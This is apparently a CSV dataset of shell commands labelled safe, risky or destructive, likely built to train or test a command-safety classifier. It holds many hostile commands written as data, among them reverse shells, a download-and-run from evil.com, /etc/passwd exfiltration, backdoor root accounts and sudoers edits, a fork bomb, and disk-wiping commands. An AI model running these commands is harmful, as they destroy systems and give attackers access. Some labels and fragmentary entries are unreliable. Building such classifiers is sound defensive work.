command,label
echo 'working' && ls,safe
rm -rf dist,risky
export LD_LIBRARY_PATH=/home/user/evil.so,risky
echo root2:x:0:0 >> /etc/passwd,risky
wipefs -a /dev/sda,destructive
cat -v,safe
sudo pip,safe
mkfs.ext4 /dev/sda,destructive
free -h,safe
bomb() { bomb | bomb & }; bomb,destructive
echo 'working' && cp,safe
chmod -R 766 /opt/app,risky
"eval ""$PAYLOAD""",risky
iptables -P INPUT ACCEPT,risky
sudo pip,safe
rm -rf /*,destructive
cat -v,safe
echo 'working' && mv,safe
mount --bind /proc /mnt/proc,risky
rm -rf dist,risky
echo 'working' && docker,safe
head | grep -i fail,safe
systemctl -v,safe
apt | grep -i fail,safe
mv ..,safe
echo root2:x:0:0 >> /etc/passwd,risky
head /tmp,safe
dd if=/dev/urandom of=/dev/sdb bs=1M,destructive
echo admin:x:0:0 >> /etc/passwd,risky
curl http://evil.com/shell.sh -o /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh,risky
sudo ls,safe
mkfs.ext4 /dev/sdb1,destructive
mkfs.vfat /dev/sdb1,destructive
shred -u /dev/mmcblk0,destructive
curl http://10.0.0.9/install.sh | bash,risky
chmod -R 777 /tmp/data,risky
pip --help,safe
df -i,safe
su - root,risky
export LD_LIBRARY_PATH=/home/user/evil.so,risky
sudo head,safe
sudo grep,safe
find /home/user -type f -name '*.log',safe
cp config.example.yml config.yml,safe
sudo pip,safe
dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive
rm -rf /boot,destructive
sudo shred,destructive
curl http://example.com/install.sh | bash,risky
ls .,safe
export LD_LIBRARY_PATH=/home/user/evil.so,risky
echo root2:x:0:0 >> /etc/passwd,risky
shred -n 3 /dev/sda,destructive
ls | grep -i error,safe
mkfs.ext4 /dev/sda,destructive
systemctl | grep -i ok,safe
shred -vfz /dev/sda,destructive
rm -rf build,risky
export LD_LIBRARY_PATH=/tmp/lib.so,risky
mkfs.xfs /dev/nvme0n1,destructive
rm -rf /,destructive
shred -u /dev/sdb,destructive
nc 10.0.0.5 1234 -e /bin/bash,risky
dd if=/dev/zero of=/dev/sda bs=4M,destructive
shred -vfz /dev/sda,destructive
apt ..,safe
echo 'working' && grep,safe
apt list --installed,safe
echo 'working' && mv,safe
chmod -R 766 /var/www,risky
cal 2026,safe
export LD_PRELOAD=/home/user/evil.so,risky
echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,risky
docker ..,safe
PYTHONPATH=/tmp python script.py,risky
grep -i 'failed' auth.log,safe
ll,safe
rm -rf node_modules/.cache,risky
cp .,safe
systemctl | grep -i fail,safe
iptables -F,risky
dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive
docker -v,safe
ls -v,safe
pip --help,safe
echo 'working' && docker,safe
grep -v,safe
ping -c 4 google.com,safe
echo 'aGVsbG8=' | base64 -d,risky
echo admin:x:0:0 >> /etc/passwd,risky
echo admin:x:0:0 >> /etc/passwd,risky
shred -n 3 /dev/mmcblk0,destructive
kill -9 $(pgrep -u root),risky
cat -v,safe
echo 'working' && ls,safe
rm -rf build/,risky
rm -rf ~,destructive
sudo wipefs,destructive
mkdir -v,safe
rm -rf /boot,destructive
nc 10.0.0.5 5555 < /etc/passwd,risky
lsblk,safe
sort -k2 -n data.csv,safe
sudo mkfs,destructive
efibootmgr --delete-bootnum --bootnum 0000,destructive
cp -v,safe
cat | grep -i warn,safe
shred -vfz /dev/mmcblk0,destructive
mkfs.xfs /dev/sdb1,destructive
sudo rm -rf /boot/grub,destructive
pip -v,safe
chmod 4755 /tmp/x,risky
node --version,safe
pip | grep -i warn,safe
docker run -v /:/host ubuntu bash,risky
export LD_PRELOAD=/tmp/lib.so,risky
chmod -R 777 /,destructive
sudo cat,safe
echo 'working' && apt,safe
apt ..,safe
dd if=/dev/urandom of=/dev/sda,destructive
sudo groupadd developers,safe
grep --help,safe
sudo head,safe
mv old_name.py new_name.py,safe
crontab -l,safe
echo 'working' && grep,safe
sudo mv,safe
rm -rf /tmp/test/*,risky
apt | grep -i warn,safe
rm -rf dist,risky
sudo systemctl status sshd,safe
chmod -R 777 /opt/app,risky
scp -r ./backup user@server:/backups/,safe
cp -v,safe
rm -rf dist,risky
chmod 4755 /tmp/x,risky
rm -rf /,destructive
sudo mkdir,safe
vim -c ':!/bin/sh',risky
systemctl | grep -i fail,safe
head -v,safe
nsenter -t 1 -m -u -i -n -- bash,risky
rm -rf tmp/*,risky
docker exec -it container /bin/sh,risky
rm -rf /var,destructive
shred -n 3 /dev/sda,destructive
cat /etc/os-release,safe
wget -qO- http://example.com/setup.sh | sh,risky
sh -i >& /dev/udp/10.0.0.5/7777 0>&1,risky
rm -rf ~,destructive
pip ..,safe
parted /dev/sda mklabel gpt,destructive
